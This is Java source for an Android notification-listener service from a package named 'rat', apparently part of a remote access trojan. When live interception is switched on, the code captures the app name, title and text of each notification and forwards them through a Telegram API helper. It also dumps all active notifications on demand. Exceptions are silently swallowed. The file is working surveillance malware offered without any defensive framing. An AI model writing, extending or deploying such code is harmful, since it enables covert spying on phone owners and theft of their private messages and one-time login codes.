package com.enterprise.rat.services;

import android.app.Notification;
import android.os.Bundle;
import android.service.notification.NotificationListenerService;
import android.service.notification.StatusBarNotification;
import com.enterprise.rat.utils.TelegramApi;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.Locale;

public class NotificationService extends NotificationListenerService {
    private static NotificationService instance;
    private boolean liveIntercept = false;

    public static NotificationService getInstance() { return instance; }

    @Override
    public void onCreate() {
        super.onCreate();
        instance = this;
    }

    @Override
    public void onNotificationPosted(StatusBarNotification sbn) {
        if (!liveIntercept) return;
        try {
            String packageName = sbn.getPackageName();
            if (packageName.equals("android") || packageName.equals("com.android.systemui")) return;

            Notification notification = sbn.getNotification();
            Bundle extras = notification.extras;
            String title = extras.getString(Notification.EXTRA_TITLE, "N/A");
            String text = extras.getCharSequence(Notification.EXTRA_TEXT, "").toString();
            long timestamp = sbn.getPostTime();
            String timeStr = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.US).format(new Date(timestamp));

            StringBuilder sb = new StringBuilder();
            sb.append("<b>🔔 New Notification</b>\n");
            sb.append("<b>App:</b> <code>").append(packageName).append("</code>\n");
            sb.append("<b>Title:</b> ").append(title).append("\n");
            sb.append("<b>Text:</b> ").append(text.length() > 300 ? text.substring(0, 300) + "..." : text).append("\n");
            sb.append("<b>Time:</b> ").append(timeStr).append("\n");

            TelegramApi.sendMessage(sb.toString());
        } catch (Exception e) {}
    }

    @Override
    public void onNotificationRemoved(StatusBarNotification sbn) {}

    public String dumpAllNotifications() {
        StringBuilder sb = new StringBuilder();
        try {
            StatusBarNotification[] activeNotifications = getActiveNotifications();
            if (activeNotifications != null) {
                for (StatusBarNotification sbn : activeNotifications) {
                    Notification notification = sbn.getNotification();
                    Bundle extras = notification.extras;
                    String title = extras.getString(Notification.EXTRA_TITLE, "N/A");
                    String text = extras.getCharSequence(Notification.EXTRA_TEXT, "").toString();
                    sb.append("App: ").append(sbn.getPackageName()).append("\n");
                    sb.append("Title: ").append(title).append("\n");
                    sb.append("Text: ").append(text).append("\n---\n");
                }
            }
        } catch (Exception e) {}
        return sb.toString();
    }

    public void setLiveInterceptEnabled(boolean enabled) { this.liveIntercept = enabled; }

    @Override
    public void onDestroy() {
        instance = null;
        super.onDestroy();
    }
}
